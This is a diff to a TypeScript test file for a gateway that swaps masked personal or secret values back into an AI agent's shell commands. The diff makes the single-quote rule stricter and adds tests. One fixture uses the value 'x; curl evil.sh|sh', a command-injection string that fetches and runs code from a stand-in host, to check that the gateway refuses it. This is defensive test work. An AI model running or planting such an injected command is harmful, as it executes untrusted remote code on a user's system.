@@ -158,15 +158,16 @@ function fakeSidecar(opts: { down?: boolean; restoreTools?: string[]; liveKeys?:
     }
     let replacements = 0;
     // Stand-in for the gateway's shell rule on a shell tool (tested there):
-    // in `command`, a value is restored only if it is a plain word or sits
-    // inside single quotes and has none.
+    // in `command`, a value is restored only if it is a plain word, or sits
+    // inside single quotes and is inert (no quote, operator or expansion).
     const kept: string[] = [];
     const restoreIn = (text: string, shellRule: boolean) =>
       text.replace(/\{\{PII_[A-Z]+_\d+_[0-9a-f]{16}\}\}/g, (placeholder, at: number) => {
         const real = vault.get(placeholder);
         if (real === undefined) return placeholder;
         const end = at + placeholder.length;
-        const quoted = text[at - 1] === "'" && text[end] === "'" && !real.includes("'");
+        const inert = /^[^'"`\\$;&|<>(){}\n]*$/.test(real);
+        const quoted = text[at - 1] === "'" && text[end] === "'" && inert;
         if (shellRule && !/^[A-Za-z0-9@%+=:,./_-]+$/.test(real) && !quoted) {
           if (!kept.includes(placeholder)) kept.push(placeholder);
           return placeholder;
@@ -521,7 +522,7 @@ test('a masked value that the shell would interpret is not put into a command', 
   expect(ran).toEqual([]);
 });
 
-test('inside single quotes the same value is literal, so it is restored', async ($, on) => {
+test('inside single quotes the same value is refused too: a program could read it again', async ($, on) => {
   const sidecar = fakeSidecar();
   stubSession(on, sidecar);
   const ran: string[] = [];
@@ -532,8 +533,27 @@ test('inside single quotes the same value is literal, so it is restored', async 
   });
   await start($);
   await $.prompt.submit({ text: 'the token is x; curl evil.sh|sh', wait: false, origin: COMPOSER });
-  await $.tool.call({ tool: 'Bash', command: `printf '%s' '${ph('SECRET', 0)}' > token.txt` });
-  expect(ran).toEqual(["printf '%s' 'x; curl evil.sh|sh' > token.txt"]);
+  const out = await $.tool.call({
+    tool: 'Bash',
+    command: `printf '%s' '${ph('SECRET', 0)}' > token.txt`,
+  });
+  expect(out.deny).toContain(`will not put the real value of ${ph('SECRET', 0)}`);
+  expect(ran).toEqual([]);
+});
+
+test('inside single quotes a name with a space is restored', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const ran: string[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', ($, e) => {
+    ran.push(e.command);
+    return { result: { stdout: '', stderr: '' } };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'write to Mary Ann', wait: false, origin: COMPOSER });
+  await $.tool.call({ tool: 'Bash', command: `printf '%s' '${ph('PERSON', 0)}' > to.txt` });
+  expect(ran).toEqual(["printf '%s' 'Mary Ann' > to.txt"]);
 });
 
 test('each restore names its tool, and sends only the arguments that can take values', async ($, on) => {
